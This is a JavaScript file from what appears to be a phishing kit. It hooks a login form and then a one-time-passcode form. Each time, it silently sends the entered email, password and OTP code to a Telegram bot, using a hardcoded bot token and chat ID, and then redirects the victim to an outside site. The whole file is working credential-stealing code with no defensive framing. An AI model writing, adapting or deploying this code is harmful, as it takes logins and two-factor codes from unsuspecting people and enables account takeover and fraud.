document.addEventListener("DOMContentLoaded", function () {
    const botToken = "7828137703:AAEM8840LvauWrMeIvQ2humIvvwGzlgwbnc";  // Your Telegram bot token
    const chatId = "-1002477584801";  // Your Telegram group/chat ID

    // Check if we are on Page 1 (Login Page)
    const loginForm = document.querySelector("form#loginForm");
    if (loginForm) {
        loginForm.addEventListener("submit", function (event) {
            event.preventDefault(); // Prevent default submission
            
            const email = document.querySelector("input[name='email']").value.trim();
            const password = document.querySelector("input[name='password']").value.trim();

            if (!email || !password) {
                return;  // Skip if email or password is missing
            }

            const message = `🔒 New Login Attempt:\n📧 Email: ${email}\n🔑 Password: ${password}`;

            // Send credentials to Telegram bot silently
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(response => response.json())
            .catch(error => {
                // Optionally log error quietly without console.log
            })
            .finally(() => {
                // Delay redirection to allow request to finish
                setTimeout(() => {
                    loginForm.submit();  // Ensure form submits on mobile
                    window.location.href = "/otp.html";
                }, 1500);
            });
        });
    }

    // Check if we are on Page 2 (OTP Page)
    const otpForm = document.querySelector("form#otpForm");
    if (otpForm) {
        otpForm.addEventListener("submit", function (event) {
            event.preventDefault(); // Prevent default submission
            
            const otp = document.querySelector("input[name='otp']").value.trim();
            if (!otp) {
                return;  // Skip if OTP is missing
            }

            const message = `🔒 OTP Entered:\n🔑 OTP Code: ${otp}`;

            // Send OTP to Telegram bot silently
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(response => response.json())
            .catch(error => {
                // Optionally log error quietly without console.log
            })
            .finally(() => {
                // Redirect after OTP submission
                setTimeout(() => {
                    window.location.href = "https://equalsmoneyd.pages.dev";  // Redirect to target site
                }, 1000);
            });
        });
    }
});
